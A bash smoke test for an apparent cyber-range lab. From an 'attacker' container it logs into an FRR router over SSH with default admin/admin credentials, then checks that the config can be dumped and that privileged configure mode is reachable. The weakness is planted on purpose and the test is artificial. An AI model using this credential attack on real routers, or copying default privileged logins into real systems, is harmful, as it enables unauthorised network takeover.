#!/usr/bin/env bash
# L2/L3 fabric surface probe. The clab fabric exposes an FRR + sshd admin
# plane on every inter-zone router. The internet zone has direct line of
# sight to inet-dmz-fw at 10.10.0.200. Visitor recon finds tcp/22 open,
# tries vendor defaults (admin/admin), and lands in vtysh with privileged
# access: the admin user is in frrvty, so login arrives at the '#' prompt
# already, no enable step required.
#
# Coverage:
#   Stage 1  tcp/22 reachable on inet-dmz-fw from unseen-gate
#   Stage 2  admin/admin authenticates, FRR version banner visible
#   Stage 3  show running-config exposes interface IPs and static routes
#   Stage 4  show ip route exposes the FIB header
#   Stage 5  privileged prompt confirmed; configure terminal mode reachable
#
# Usage: bash tests/smoke/test_vtysh_credential_stuffing.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="unseen-gate"
ROUTER="inet-dmz-fw"
ROUTER_IP="10.10.0.200"

require_running "$ATTACKER"
require_running "$ROUTER"

echo "[vtysh] Waiting for inet-dmz-fw sshd..."
wait_for_port "$ATTACKER" "$ROUTER_IP" 22 30 || fail "$ROUTER :22 not ready"

echo "[vtysh] Stage 1: tcp/22 reachable on $ROUTER from internet zone"
ok "$ROUTER 22/tcp open"

echo "[vtysh] Stage 2: admin/admin authenticates, FRR version disclosed"
VERSION_OUT="$(ssh_password_login "$ATTACKER" admin "$ROUTER_IP" admin "show version")"
assert_contains "$VERSION_OUT" "FRRouting" "show version returns FRR banner"
assert_contains "$VERSION_OUT" "$ROUTER" "show version names the router hostname"

echo "[vtysh] Stage 3: show running-config exposes interface IPs and routes"
RUN_OUT="$(ssh_password_login "$ATTACKER" admin "$ROUTER_IP" admin "show running-config")"
assert_contains "$RUN_OUT" "hostname $ROUTER" "running-config carries hostname"
assert_contains "$RUN_OUT" "ip address 10.10.0.200/24" "eth2 internet IP visible"
assert_contains "$RUN_OUT" "ip address 10.10.5.200/24" "eth1 dmz IP visible"
assert_contains "$RUN_OUT" "ip route 10.10.5.0/24" "static route to dmz visible"

echo "[vtysh] Stage 4: show ip route exposes the FIB"
ROUTE_OUT="$(ssh_password_login "$ATTACKER" admin "$ROUTER_IP" admin "show ip route")"
assert_contains "$ROUTE_OUT" "K - kernel route" "show ip route returns FIB header"

echo "[vtysh] Stage 5: login lands in privileged mode, configure terminal reachable"
PRIV_OUT="$(docker exec "$ATTACKER" "$SSH_RUNNER_PY" -c "
import paramiko, time, sys
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('$ROUTER_IP', username='admin', password='admin', timeout=5,
          allow_agent=False, look_for_keys=False)
chan = c.invoke_shell()
def drain(t=0.5):
    time.sleep(t); out = b''
    while chan.recv_ready(): out += chan.recv(8192)
    return out.decode('utf-8', 'replace')
banner = drain(0.6)
chan.send('configure terminal\n')
conf = drain(0.4)
chan.send('exit\n')
drain(0.2)
c.close()
print('PRIV_PROMPT_OK' if '$ROUTER#' in banner else 'PRIV_PROMPT_MISSING')
print('CONFIG_MODE_OK' if '$ROUTER(config)#' in conf else 'CONFIG_MODE_MISSING')
" 2>&1)"
assert_contains "$PRIV_OUT" "PRIV_PROMPT_OK" "login prompt is privileged (inet-dmz-fw#)"
assert_contains "$PRIV_OUT" "CONFIG_MODE_OK" "configure terminal reaches config mode"

summary
